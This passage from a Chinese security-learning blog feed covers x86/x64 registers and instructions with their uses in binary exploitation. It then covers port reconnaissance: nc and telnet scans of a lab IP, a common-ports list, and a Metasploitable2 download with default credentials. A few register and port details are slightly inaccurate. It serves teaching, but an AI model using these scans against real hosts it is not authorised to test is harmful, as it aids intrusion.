align="left"><strong>子寄存器关系</strong></th></tr></thead><tbody><tr><td align="left"><strong>RAX</strong></td><td align="left">64-bit</td><td align="left">函数返回值、算术运算</td><td align="left">系统调用号(Syscall)</td><td align="left">RAX → EAX → AX → AH&#x2F;AL</td></tr><tr><td align="left"><strong>EAX</strong></td><td align="left">32-bit</td><td align="left">累加器、算术运算主存器</td><td align="left">乘法&#x2F;除法结果存储</td><td align="left">EAX → AX → AH&#x2F;AL</td></tr><tr><td align="left"><strong>AX</strong></td><td align="left">16-bit</td><td align="left">字乘法&#x2F;字除法&#x2F;字I&#x2F;O</td><td align="left">-</td><td align="left">AX → AH(高8位)&#x2F;AL(低8位)</td></tr><tr><td align="left"><strong>AL</strong></td><td align="left">8-bit</td><td align="left">字节乘法&#x2F;字节除法&#x2F;字节I&#x2F;O 十进制运算</td><td align="left">BCD运算</td><td align="left">AX的低字节</td></tr><tr><td align="left"><strong>AH</strong></td><td align="left">8-bit</td><td align="left">字节乘法&#x2F;字节除法</td><td align="left">-</td><td align="left">AX的高字节</td></tr><tr><td align="left"><strong>RBX</strong></td><td align="left">64-bit</td><td align="left">通用数据存储</td><td align="left">内存寻址基址</td><td align="left">RBX → EBX → BX → BH&#x2F;BL</td></tr><tr><td align="left"><strong>EBX</strong></td><td align="left">32-bit</td><td align="left">内存寻址基址</td><td align="left">-</td><td align="left">EBX → BX → BH&#x2F;BL</td></tr><tr><td align="left"><strong>BX</strong></td><td align="left">16-bit</td><td align="left">内存指针</td><td align="left">段寄存器(DS)的默认基址</td><td align="left">BX → BH(高8位)&#x2F;BL(低8位)</td></tr><tr><td align="left"><strong>RCX</strong></td><td align="left">64-bit</td><td align="left">循环计数器</td><td align="left">REP前缀指令计数</td><td align="left">RCX → ECX → CX → CH&#x2F;CL</td></tr><tr><td align="left"><strong>ECX</strong></td><td align="left">32-bit</td><td align="left">循环计数器</td><td align="left">-</td><td align="left">ECX → CX → CH&#x2F;CL</td></tr><tr><td align="left"><strong>CX</strong></td><td align="left">16-bit</td><td align="left">串操作&#x2F;循环控制</td><td align="left">-</td><td align="left">CX → CH(高8位)&#x2F;CL(低8位)</td></tr><tr><td align="left"><strong>CL</strong></td><td align="left">8-bit</td><td align="left">移位&#x2F;旋转计数器</td><td align="left">位操作指令</td><td align="left">CX的低字节</td></tr><tr><td align="left"><strong>RDX</strong></td><td align="left">64-bit</td><td align="left">I&#x2F;O指针、数据存储</td><td align="left">除法余数存储</td><td align="left">RDX → EDX → DX → DH&#x2F;DL</td></tr><tr><td align="left"><strong>EDX</strong></td><td align="left">32-bit</td><td align="left">字乘法&#x2F;字除法 间接I&#x2F;O</td><td align="left">除法余数</td><td align="left">EDX → DX → DH&#x2F;DL</td></tr><tr><td align="left"><strong>DX</strong></td><td align="left">16-bit</td><td align="left">端口地址指针</td><td align="left">-</td><td align="left">DX → DH(高8位)&#x2F;DL(低8位)</td></tr><tr><td align="left"><strong>RSI</strong></td><td align="left">64-bit</td><td align="left">内存源指针</td><td align="left">串操作源地址</td><td align="left">RSI → ESI → SI</td></tr><tr><td align="left"><strong>ESI</strong></td><td align="left">32-bit</td><td align="left">内存源指针</td><td align="left">LODS&#x2F;MOVS等指令</td><td align="left">ESI → SI</td></tr><tr><td align="left"><strong>SI</strong></td><td align="left">16-bit</td><td align="left">串操作源指针</td><td align="left">DS段偏移</td><td align="left">-</td></tr><tr><td align="left"><strong>RDI</strong></td><td align="left">64-bit</td><td align="left">内存目的指针</td><td align="left">串操作目的地址</td><td align="left">RDI → EDI → DI</td></tr><tr><td align="left"><strong>EDI</strong></td><td align="left">32-bit</td><td align="left">内存目的指针</td><td align="left">STOS&#x2F;MOVS等指令</td><td align="left">EDI → DI</td></tr><tr><td align="left"><strong>DI</strong></td><td align="left">16-bit</td><td align="left">串操作目的指针</td><td align="left">ES段偏移</td><td align="left">-</td></tr><tr><td align="left"><strong>RBP</strong></td><td align="left">64-bit</td><td align="left"><strong>栈基指针</strong></td><td align="left">访问栈帧参数&#x2F;局部变量</td><td align="left">RBP → EBP → BP</td></tr><tr><td align="left"><strong>EBP</strong></td><td align="left">32-bit</td><td align="left"><strong>栈基指针</strong></td><td align="left">函数栈帧基准</td><td align="left">EBP → BP</td></tr><tr><td align="left"><strong>BP</strong></td><td align="left">16-bit</td><td align="left">栈数据访问指针</td><td align="left">SS段偏移</td><td align="left">-</td></tr><tr><td align="left"><strong>RSP</strong></td><td align="left">64-bit</td><td align="left"><strong>栈顶指针</strong></td><td align="left">当前栈顶位置</td><td align="left">RSP → ESP → SP</td></tr><tr><td align="left"><strong>ESP</strong></td><td align="left">32-bit</td><td align="left"><strong>栈顶指针</strong></td><td align="left">PUSH&#x2F;POP操作</td><td align="left">ESP → SP</td></tr><tr><td align="left"><strong>SP</strong></td><td align="left">16-bit</td><td align="left">栈顶指针</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left"><strong>RIP</strong></td><td align="left">64-bit</td><td align="left"><strong>指令指针</strong></td><td align="left">存放下一条指令地址</td><td align="left">RIP → EIP → IP</td></tr><tr><td align="left"><strong>EIP</strong></td><td align="left">32-bit</td><td align="left"><strong>指令指针</strong></td><td align="left">控制程序执行流程</td><td align="left">EIP → IP</td></tr><tr><td align="left"><strong>IP</strong></td><td align="left">16-bit</td><td align="left">指令指针</td><td align="left">实模式下使用</td><td align="left">-</td></tr></tbody></table><h4 id="关键补充说明："><a href="#关键补充说明：" class="headerlink" title="关键补充说明："></a>关键补充说明：</h4><h5 id="寄存器层级关系："><a href="#寄存器层级关系：" class="headerlink" title="寄存器层级关系："></a>寄存器层级关系：</h5><ul><li>64位寄存器 (R开头)：<code>RAX</code>, <code>RBX</code>, <code>RCX</code>, <code>RDX</code>, <code>RSI</code>, <code>RDI</code>, <code>RBP</code>, <code>RSP</code>, <code>RIP</code></li><li>32位寄存器 (E开头)：<code>EAX</code>, <code>EBX</code>, <code>ECX</code>, <code>EDX</code>, <code>ESI</code>, <code>EDI</code>, <code>EBP</code>, <code>ESP</code>, <code>EIP</code></li><li>16位寄存器：<code>AX</code>, <code>BX</code>, <code>CX</code>, <code>DX</code>, <code>SI</code>, <code>DI</code>, <code>BP</code>, <code>SP</code>, <code>IP</code></li><li>8位寄存器：<code>AH</code>&#x2F;<code>AL</code>, <code>BH</code>&#x2F;<code>BL</code>, <code>CH</code>&#x2F;<code>CL</code>, <code>DH</code>&#x2F;<code>DL</code></li></ul><h5 id="Pwn-逆向中的核心寄存器："><a href="#Pwn-逆向中的核心寄存器：" class="headerlink" title="Pwn&#x2F;逆向中的核心寄存器："></a>Pwn&#x2F;逆向中的核心寄存器：</h5><ul><li><strong>RIP&#x2F;EIP</strong>：控制程序执行流（劫持核心目标）</li><li><strong>RSP&#x2F;ESP</strong>：栈指针（缓冲区溢出关键）</li><li><strong>RBP&#x2F;EBP</strong>：栈帧基准（定位局部变量&#x2F;参数）</li><li><strong>RAX&#x2F;EAX</strong>：存储系统调用号和函数返回值</li></ul><h5 id="特殊功能寄存器："><a href="#特殊功能寄存器：" class="headerlink" title="特殊功能寄存器："></a>特殊功能寄存器：</h5><ul><li><strong>段寄存器</strong>：CS（代码段）, DS（数据段）, SS（堆栈段）, ES&#x2F;FS&#x2F;GS（附加段）</li><li><strong>标志寄存器</strong>：EFLAGS&#x2F;RFLAGS（存储状态标志如ZF&#x2F;CF&#x2F;SF等）</li></ul><h5 id="寄存器使用场景："><a href="#寄存器使用场景：" class="headerlink" title="寄存器使用场景："></a>寄存器使用场景：</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#函数调用示例</span><br><span class="line">push rbp            ; 保存调用者栈帧</span><br><span class="line">mov rbp, rsp        ; 建立新栈帧</span><br><span class="line">mov eax, [rbp+8]    ; 获取第一个参数</span><br><span class="line">add eax, [rbp+12]   ; 加上第二个参数</span><br><span class="line">pop rbp             ; 恢复栈帧</span><br><span class="line">ret                 ; 返回到RIP指向地址</span><br></pre></td></tr></table></figure><h5 id="64位与32位差异："><a href="#64位与32位差异：" class="headerlink" title="64位与32位差异："></a>64位与32位差异：</h5><ul><li>64位新增寄存器：R8-R15</li><li>调用约定变更：64位使用RCX&#x2F;RDX&#x2F;R8&#x2F;R9传参</li><li>内存寻址范围扩大：64位支持48位虚拟地址空间</li></ul><h5 id="栈帧："><a href="#栈帧：" class="headerlink" title="栈帧："></a>栈帧：</h5><p>一个栈帧就是保存一个函数的状态，简单来说就是一个函数所需要的栈空间.</p><p>rsp(栈顶寄存器) &#x2F;esp(栈指针寄存器)永远指向栈帧的栈顶，rbp(栈基寄存器)&#x2F;ebp(扩展基址指针寄存器)则永远指向栈帧的栈底,rip(程序计数寄存器)&#x2F;eip(指令指针寄存器)指向当前栈栈帧执行的命令。</p><p>栈从高地址向低地址开辟内存空间，所以低地址的是栈顶，而栈底的第一个栈帧在这里存放着我们的主函数的父函数，所以main函数并不是最栈顶的函数，main上面还会在编译过程中有一些库函数，但是他们并不会产生栈帧，因为栈先进后出的特性，所以当在main函数中需要调用其他函数时，就开辟一个新的函数栈帧，并存储上一个栈的栈底，当调用结束时，将现在的栈帧弹出，恢复到原来的main函数继续执行完main函数。</p><p><img src="/../../../../../images/image-20250630161338940.png" alt="image-20250630161338940"></p><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><h4 id="整数常量"><a href="#整数常量" class="headerlink" title="整数常量"></a>整数常量</h4><h5 id="表达方式："><a href="#表达方式：" class="headerlink" title="表达方式："></a>表达方式：</h5><table><thead><tr><th align="left"><strong>进制</strong></th><th align="left"><strong>前缀</strong></th><th align="left"><strong>示例</strong></th><th align="left">汇编表示</th></tr></thead><tbody><tr><td align="left"><strong>十进制</strong></td><td align="left">无</td><td align="left"><code>12345</code></td><td align="left"><code>mov eax, 12345</code></td></tr><tr><td align="left"><strong>十六进制</strong></td><td align="left"><code>0x</code></td><td align="left"><code>0xDEADBEEF</code></td><td align="left"><code>mov ebx, 0xDEADBEEF</code></td></tr><tr><td align="left"><strong>八进制</strong></td><td align="left"><code>0</code></td><td align="left"><code>0755</code></td><td align="left"><code>mov ecx, 0755</code></td></tr><tr><td align="left"><strong>二进制</strong></td><td align="left"><code>0b</code></td><td align="left"><code>0b10101010</code></td><td align="left"><code>mov dl, 0b10101010</code></td></tr></tbody></table><h5 id="内存存储（小端序）："><a href="#内存存储（小端序）：" class="headerlink" title="内存存储（小端序）："></a>内存存储（小端序）：</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> num = <span class="number">0x12345678</span>;  <span class="comment">// 32位整数</span></span><br><span class="line"><span class="comment">// 内存布局（地址递增）：</span></span><br><span class="line">Address: <span class="number">0x1000</span> → <span class="number">0x78</span></span><br><span class="line">Address: <span class="number">0x1001</span> → <span class="number">0x56</span></span><br><span class="line">Address: <span class="number">0x1002</span> → <span class="number">0x34</span></span><br><span class="line">Address: <span class="number">0x1003</span> → <span class="number">0x12</span></span><br></pre></td></tr></table></figure><h4 id="浮点数常量"><a href="#浮点数常量" class="headerlink" title="浮点数常量"></a>浮点数常量</h4><h5 id="IEEE-754标准："><a href="#IEEE-754标准：" class="headerlink" title="IEEE 754标准："></a>IEEE 754标准：</h5><table><thead><tr><th align="left"><strong>类型</strong></th><th align="left"><strong>总位数</strong></th><th align="left"><strong>符号位</strong></th><th align="left"><strong>指数位</strong></th><th align="left"><strong>尾数位</strong></th><th align="left"><strong>范围</strong></th><th align="left"><strong>示例</strong></th></tr></thead><tbody><tr><td align="left"><strong>float</strong></td><td align="left">32-bit</td><td align="left">1 bit</td><td align="left">8 bits</td><td align="left">23 bits</td><td align="left">±3.4e38</td><td align="left"><code>3.14f</code></td></tr><tr><td align="left"><strong>double</strong></td><td align="left">64-bit</td><td align="left">1 bit</td><td align="left">11 bits</td><td align="left">52 bits</td><td align="left">±1.7e308</td><td align="left"><code>2.71828</code></td></tr></tbody></table><h5 id="内存布局（float示例）："><a href="#内存布局（float示例）：" class="headerlink" title="内存布局（float示例）："></a>内存布局（float示例）：</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">float</span> pi = <span class="number">3.14159</span>;  <span class="comment">// 十六进制: 0x40490FD0</span></span><br><span class="line"><span class="comment">// 内存结构（小端序）：</span></span><br><span class="line"><span class="number">0x0000</span>: D0  <span class="comment">// 尾数低位</span></span><br><span class="line"><span class="number">0x0001</span>: <span class="number">0F</span>  </span><br><span class="line"><span class="number">0x0002</span>: <span class="number">49</span>  <span class="comment">// 尾数高位 + 指数低位</span></span><br><span class="line"><span class="number">0x0003</span>: <span class="number">40</span>  <span class="comment">// 符号(0) + 指数高位</span></span><br></pre></td></tr></table></figure><h4 id="字符串常量"><a href="#字符串常量" class="headerlink" title="字符串常量"></a>字符串常量</h4><h5 id="内存表示："><a href="#内存表示：" class="headerlink" title="内存表示："></a>内存表示：</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *str = <span class="string">&quot;Hello Pwn!&quot;</span>; </span><br><span class="line"><span class="comment">// 内存布局：</span></span><br><span class="line">Address: <span class="number">0x4000</span> → <span class="string">&#x27;H&#x27;</span> (<span class="number">0x48</span>)</span><br><span class="line">Address: <span class="number">0x4001</span> → <span class="string">&#x27;e&#x27;</span> (<span class="number">0x65</span>)</span><br><span class="line">...</span><br><span class="line">Address: <span class="number">0x4009</span> → <span class="string">&#x27;!&#x27;</span> (<span class="number">0x21</span>)</span><br><span class="line">Address: <span class="number">0x400A</span> → <span class="number">0x00</span>  <span class="comment">// NULL终止符</span></span><br></pre></td></tr></table></figure><h5 id="汇编定义："><a href="#汇编定义：" class="headerlink" title="汇编定义："></a>汇编定义：</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">section .data</span><br><span class="line">    msg db &#x27;Hello Pwn!&#x27;, 0x0A, 0  ; 带换行符的字符串</span><br><span class="line">section .text</span><br><span class="line">    mov rsi, msg   ; 字符串地址 → RSI</span><br><span class="line">    mov rdx, 11    ; 长度(包括换行)</span><br><span class="line">    syscall        ; Linux写系统调用</span><br></pre></td></tr></table></figure><h2 id="标志位"><a href="#标志位" class="headerlink" title="标志位"></a>标志位</h2><p><strong>·进位标志CF(Carry Flag):</strong><br>进位标志CF主要用来反映运算是否产生进位或借位。如果运算结果的最高 位产生了一个进位或借位，那么，其值为1，否则其值为0。<br><strong>·奇偶标志PF(Parity Flag):</strong><br>奇偶标志PF用于反映运算结果中“1”的个数的奇偶性。如果“1”的个数为偶数，则PF的值为1，否则其值为0。<br><strong>·辅助进位标志AF(Auxiliary Carry Flag)：</strong><br>在发生下列情况时，辅助进位标志AF的值被置为1，否则其值为0(在字操作时，发生低字节向高字节进位或借位时；在字节操作时，发生低4位向高4位进位或借位时)。<br><strong>·零标志ZF(ZeroFlag):</strong><br>零标志ZF用来反映运算结果是否为0。如果运算结果为0，则其值为1，否则其值为0。在判断运算结果是否为0时，可使用此标志位。<br><strong>·符号标志SF(Sign Flag):</strong><br>符号标志SF用来反映运算结果的符号位，它与运算结果的最高位相同。在微机系统中，有符号数采用码表示法，所以，SF也就反映运算结果的正负号。运算结果为正数时，SF的值为0，否则其值为1。<br><strong>·溢出标志OF(Overflow Flag):</strong><br>溢出标志OF用于反映有符号数加减运算所得结果是否溢出。如果运算结果超过当前运算位数所能表示的范围，则称为溢出，OF的值被置为1，否则，OF的值被清为0。 </p><h2 id="汇编指令"><a href="#汇编指令" class="headerlink" title="汇编指令"></a>汇编指令</h2><h3 id="常用指令表"><a href="#常用指令表" class="headerlink" title="常用指令表"></a>常用指令表</h3><table><thead><tr><th align="left"><strong>指令类型</strong></th><th align="left"><strong>指令</strong></th><th align="left"><strong>语法</strong></th><th align="left"><strong>功能描述</strong></th><th align="left"><strong>标志位影响</strong></th><th align="left"><strong>Pwn应用场景</strong></th></tr></thead><tbody><tr><td align="left"><strong>数据传送</strong></td><td align="left"><code>MOV</code></td><td align="left"><code>MOV 目标, 源</code></td><td align="left">将源操作数复制到目标</td><td align="left"><strong>无影响</strong></td><td align="left">构造ROP链、寄存器控制</td></tr><tr><td align="left"></td><td align="left"><code>LEA</code></td><td align="left"><code>LEA 目标, [内存]</code></td><td align="left">加载有效地址（不访问内存）</td><td align="left"><strong>无影响</strong></td><td align="left">计算地址绕过ASLR</td></tr><tr><td align="left"><strong>算术运算</strong></td><td align="left"><code>ADD</code></td><td align="left"><code>ADD 目标, 源</code></td><td align="left">目标 &#x3D; 目标 + 源</td><td align="left"><strong>CF,OF,SF,ZF</strong></td><td align="left">整数溢出漏洞利用</td></tr><tr><td align="left"></td><td align="left"><code>SUB</code></td><td align="left"><code>SUB 目标, 源</code></td><td align="left">目标 &#x3D; 目标 - 源</td><td align="left"><strong>CF,OF,SF,ZF</strong></td><td align="left">内存地址计算</td></tr><tr><td align="left"></td><td align="left"><code>INC</code></td><td align="left"><code>INC 目标</code></td><td align="left">目标 &#x3D; 目标 + 1</td><td align="left"><strong>OF,SF,ZF</strong></td><td align="left">计数器修改</td></tr><tr><td align="left"></td><td align="left"><code>DEC</code></td><td align="left"><code>DEC 目标</code></td><td align="left">目标 &#x3D; 目标 - 1</td><td align="left"><strong>OF,SF,ZF</strong></td><td align="left">循环控制</td></tr><tr><td align="left"><strong>逻辑运算</strong></td><td align="left"><code>AND</code></td><td align="left"><code>AND 目标, 源</code></td><td align="left">目标 &#x3D; 目标 &amp; 源</td><td align="left"><strong>CF&#x3D;0,OF&#x3D;0,SF,ZF</strong></td><td align="left">位掩码操作</td></tr><tr><td align="left"></td><td align="left"><code>OR</code></td><td align="left"><code>OR 目标, 源</code></td><td align="left">目标 &#x3D; 目标 | 源</td><td align="left"><strong>CF&#x3D;0,OF&#x3D;0,SF,ZF</strong></td><td align="left">位设置</td></tr><tr><td align="left"></td><td align="left"><code>XOR</code></td><td align="left"><code>XOR 目标, 源</code></td><td align="left">目标 &#x3D; 目标 ^ 源</td><td align="left"><strong>CF&#x3D;0,OF&#x3D;0,SF,ZF</strong></td><td align="left">清零寄存器(<code>XOR EAX, EAX</code>)</td></tr><tr><td align="left"></td><td align="left"><code>NOT</code></td><td align="left"><code>NOT 目标</code></td><td align="left">目标 &#x3D; ~目标</td><td align="left"><strong>无影响</strong></td><td align="left">位翻转</td></tr><tr><td align="left"><strong>控制转移</strong></td><td align="left"><code>CALL</code></td><td align="left"><code>CALL 地址</code></td><td align="left">1. 压入返回地址 2. 跳转到目标地址</td><td align="left"><strong>无影响</strong></td><td align="left">函数调用劫持</td></tr><tr><td align="left"></td><td align="left"><code>RET</code></td><td align="left"><code>RET [n]</code></td><td align="left">1. 弹出返回地址 2. 跳转到该地址 3. 可选栈调整</td><td align="left"><strong>无影响</strong></td><td align="left">栈溢出利用</td></tr><tr><td align="left"></td><td align="left"><code>JMP</code></td><td align="left"><code>JMP 地址</code></td><td align="left">无条件跳转</td><td align="left"><strong>无影响</strong></td><td align="left">程序流劫持</td></tr><tr><td align="left"><strong>比较测试</strong></td><td align="left"><code>CMP</code></td><td align="left"><code>CMP 操作数1, 操作数2</code></td><td align="left">设置标志位(操作数1 - 操作数2)</td><td align="left"><strong>CF,OF,SF,ZF</strong></td><td align="left">条件分支漏洞利用</td></tr><tr><td align="left"></td><td align="left"><code>TEST</code></td><td align="left"><code>TEST 操作数1, 操作数2</code></td><td align="left">设置标志位(操作数1 &amp; 操作数2)</td><td align="left"><strong>CF&#x3D;0,OF&#x3D;0,SF,ZF</strong></td><td align="left">权限检查绕过</td></tr><tr><td align="left"><strong>栈操作</strong></td><td align="left"><code>PUSH</code></td><td align="left"><code>PUSH 源</code></td><td align="left">1. ESP -&#x3D; 4&#x2F;8 2. [ESP] &#x3D; 源</td><td align="left"><strong>无影响</strong></td><td align="left">栈帧构造</td></tr><tr><td align="left"></td><td align="left"><code>POP</code></td><td align="left"><code>POP 目标</code></td><td align="left">1. 目标 &#x3D; [ESP] 2. ESP +&#x3D; 4&#x2F;8</td><td align="left"><strong>无影响</strong></td><td align="left">ROP gadget利用</td></tr><tr><td align="left"><strong>系统调用</strong></td><td align="left"><code>INT</code></td><td align="left"><code>INT n</code></td><td align="left">触发软件中断</td><td align="left"><strong>影响所有</strong></td><td align="left">系统调用利用</td></tr><tr><td align="left"></td><td align="left"><code>SYSCALL</code></td><td align="left"><code>SYSCALL</code></td><td align="left">快速系统调用</td><td align="left"><strong>影响所有</strong></td><td align="left">现代漏洞利用</td></tr></tbody></table><h3 id="关键指令深度解析"><a href="#关键指令深度解析" class="headerlink" title="关键指令深度解析"></a>关键指令深度解析</h3><h4 id="MOV-vs-LEA"><a href="#MOV-vs-LEA" class="headerlink" title="MOV vs LEA"></a>MOV vs LEA</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; MOV - 内存访问</span><br><span class="line">mov eax, [ebx]   ; 将ebx指向的内存内容加载到eax</span><br><span class="line"></span><br><span class="line">; LEA - 不访问内存</span><br><span class="line">lea eax, [ebx+8] ; 计算地址值ebx+8并存入eax（不读取内存）</span><br></pre></td></tr></table></figure><p><strong>Pwn应用</strong>：LEA常用于计算地址偏移，绕过ASLR</p><h4 id="CMP与条件跳转"><a href="#CMP与条件跳转" class="headerlink" title="CMP与条件跳转"></a>CMP与条件跳转</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmp eax, 100     ; 比较eax和100</span><br><span class="line">jg  overflow     ; 若eax &gt; 100则跳转</span><br></pre></td></tr></table></figure><p><strong>标志位关系</strong>：</p><table><thead><tr><th align="left"><strong>跳转指令</strong></th><th align="left"><strong>含义</strong></th><th align="left"><strong>检查标志</strong></th></tr></thead><tbody><tr><td align="left"><code>JE/JZ</code></td><td align="left">相等&#x2F;零</td><td align="left">ZF&#x3D;1</td></tr><tr><td align="left"><code>JNE/JNZ</code></td><td align="left">不等&#x2F;非零</td><td align="left">ZF&#x3D;0</td></tr><tr><td align="left"><code>JG/JNLE</code></td><td align="left">大于</td><td align="left">ZF&#x3D;0且SF&#x3D;OF</td></tr><tr><td align="left"><code>JL/JNGE</code></td><td align="left">小于</td><td align="left">SF≠OF</td></tr></tbody></table><h4 id="CALL-RET-机制"><a href="#CALL-RET-机制" class="headerlink" title="CALL-RET 机制"></a>CALL-RET 机制</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call func:   ; 相当于</span><br><span class="line">  push eip+5 ; 压入返回地址(下条指令)</span><br><span class="line">  jmp func</span><br><span class="line"></span><br><span class="line">ret:        ; 相当于</span><br><span class="line">  pop eip   ; 弹出返回地址到EIP</span><br></pre></td></tr></table></figure><p><strong>漏洞利用</strong>：缓冲区溢出覆盖返回地址</p><h4 id="栈操作指令"><a href="#栈操作指令" class="headerlink" title="栈操作指令"></a>栈操作指令</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 函数序言</span><br><span class="line">push ebp</span><br><span class="line">mov ebp, esp</span><br><span class="line"></span><br><span class="line">; 函数尾声</span><br><span class="line">mov esp, ebp</span><br><span class="line">pop ebp</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p><strong>Pwn意义</strong>：栈帧结构是缓冲区溢出的基础</p><h4 id="TEST指令妙用"><a href="#TEST指令妙用" class="headerlink" title="TEST指令妙用"></a>TEST指令妙用</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">test eax, eax  ; 检查eax是否为0</span><br><span class="line">jz   exit      ; 为零则跳转</span><br><span class="line"></span><br><span class="line">test al, 1     ; 检查最低位</span><br><span class="line">jnz  odd       ; 为奇数则跳转</span><br></pre></td></tr></table></figure><h3 id="汇编与高级语言的对应关系"><a href="#汇编与高级语言的对应关系" class="headerlink" title="汇编与高级语言的对应关系"></a>汇编与高级语言的对应关系</h3><p> C 语言与汇编（x86-64）的简单映射示例：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> result = add(<span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; add函数</span><br><span class="line">add:</span><br><span class="line">    MOV EAX, ECX      ; 第一个参数(a)从ECX移入EAX</span><br><span class="line">    ADD EAX, EDX      ; EAX += 第二个参数(b)</span><br><span class="line">    RET               ; 返回EAX的值</span><br><span class="line"></span><br><span class="line">; main函数</span><br><span class="line">main:</span><br><span class="line">    MOV ECX, 3        ; 第一个参数3存入ECX</span><br><span class="line">    MOV EDX, 4        ; 第二个参数4存入EDX</span><br><span class="line">    CALL add          ; 调用add函数</span><br><span class="line">    XOR EAX, EAX      ; EAX = 0（返回值）</span><br><span class="line">    RET</span><br></pre></td></tr></table></figure><p>第一二章 前言-汇编的概念：<a href="http://fynote.com/s/3251">http://fynote.com/s/3251</a><br>第三章 寄存器：<a href="http://fynote.com/s/3269">http://fynote.com/s/3269</a><br>第四章 汇编程序：<a href="http://fynote.com/s/3315">http://fynote.com/s/3315</a><br>第五章 汇编指令：<a href="http://fynote.com/s/3354">http://fynote.com/s/3354</a></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 2-汇编基础 </category>
          
          <category> x86x64汇编基础 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2025/06/2167c014e2bb.html"/>
      <url>/2025/06/2167c014e2bb.html</url>
      
        <content type="html"><![CDATA[<p>title: 端口服务信息<br>date: 2025-06-29 20:16:36<br>categories:<br>tags: -渗透测试</p><h1 id="扫描的思路和代码实现"><a href="#扫描的思路和代码实现" class="headerlink" title="扫描的思路和代码实现"></a>扫描的思路和代码实现</h1><h2 id="一个服务一个端口"><a href="#一个服务一个端口" class="headerlink" title="一个服务一个端口"></a>一个服务一个端口</h2><h2 id="查看本机端口信息"><a href="#查看本机端口信息" class="headerlink" title="查看本机端口信息"></a>查看本机端口信息</h2><h6 id="windows"><a href="#windows" class="headerlink" title="windows:"></a>windows:</h6><p>netstat -aon|findstr 3306</p><h6 id="Linux"><a href="#Linux" class="headerlink" title="Linux:"></a>Linux:</h6><p>netstat -an|grep 3306</p><p>若未显示结果，说明对应服务未启动（如示例中的MySQL和80端口服务）</p><h2 id="远程机器端口"><a href="#远程机器端口" class="headerlink" title="远程机器端口"></a>远程机器端口</h2><p>telnet 192.168.142.130 80</p><p>wget 192.168.142.130 80</p><p>nc -vz 192.168.142.130 445</p><p>python代码扫描 wscan.py（批量扫描）</p><p>nc -vz 192.168.142.130 80-9000（netcat有扫描功能，能显示服务名称）</p><h1 id="常见端口"><a href="#常见端口" class="headerlink" title="常见端口"></a>常见端口</h1><p><a href="https://nsrc.org/workshops/2009/summer/presentations/day3/common-ports.pdf">(Cheat Sheet - Common Ports)</a></p><h2 id="文件共享服务"><a href="#文件共享服务" class="headerlink" title="文件共享服务"></a>文件共享服务</h2><p>21&#x2F;22&#x2F;69：FTP&#x2F;SFTP文件传输协议<br>2049：NFS服务（Network File System）<br>139：Samba服务<br>389：LDAP目录访问协议（Light Directory Access Portocol）</p><h2 id="远程连接服务"><a href="#远程连接服务" class="headerlink" title="远程连接服务"></a>远程连接服务</h2><p>22：SSH远程连接<br>23：Telnet远程连接<br>3389：RDP远程桌面连接<br>5900：VNC远程连接<br>5632：PcAnywhere远程控制服务</p><h2 id="Web应用服务"><a href="#Web应用服务" class="headerlink" title="Web应用服务"></a>Web应用服务</h2><p>80&#x2F;443&#x2F;8080：常见的web服务端口<br>7001&#x2F;7002：Weblogic控制台<br>8080&#x2F;8089：Jboss&#x2F;resin&#x2F;jetty&#x2F;Jenkins</p><p>9090：Websphere控制台<br>4848：Glassfish控制台<br>1352：Lotus domino邮件服务<br>10000：Webmin-web控制面板</p><h2 id="数据库服务"><a href="#数据库服务" class="headerlink" title="数据库服务"></a>数据库服务</h2><p>3306：MySQL<br>1433：MSSQL数据库<br>1521：Oracle数据库<br>5432：PostgreSQL数据库<br>27017&#x2F;27018：MongoDB<br>6379：Redis数据库<br>5000：Sysbase&#x2F;DB2数据库</p><h2 id="邮件服务"><a href="#邮件服务" class="headerlink" title="邮件服务"></a>邮件服务</h2><p>25：SMTP邮件服务<br>110：POP3协议<br>143：IMAP协议</p><h2 id="网络常见协议"><a href="#网络常见协议" class="headerlink" title="网络常见协议"></a>网络常见协议</h2><p>53：DNS域名系统<br>67&#x2F;68：DHCP服务<br>161：SNMP协议</p><h2 id="特殊服务"><a href="#特殊服务" class="headerlink" title="特殊服务"></a>特殊服务</h2><p>2181：Zookeeper服务<br>8069：Zabbix服务<br>9200&#x2F;9300：Elasticsearch服务<br>11211：Memcached服务<br>512&#x2F;513&#x2F;514：Linux Rexec服务<br>873：Rsync服务<br>3690：SVN服务<br>50000：SAP Management Console</p><h1 id="metasploitable2靶机"><a href="#metasploitable2靶机" class="headerlink" title="metasploitable2靶机"></a>metasploitable2靶机</h1><p>链接：<a href="https://pan.baidu.com/s/1u-MTtxATAfhE5ELnhCS-Fg">https://pan.baidu.com/s/1u-MTtxATAfhE5ELnhCS-Fg</a><br>提取码：8888 </p><p>下载、解压、导入VM<br>默认用户名密码 msfadmin&#x2F;msfadmin<br>修改root密码 sudo passwd root<br>ifconfig查看IP</p><h1 id="端口扫描工具NMap（Network-Mapper）"><a href="#端口扫描工具NMap（Network-Mapper）" class="headerlink" 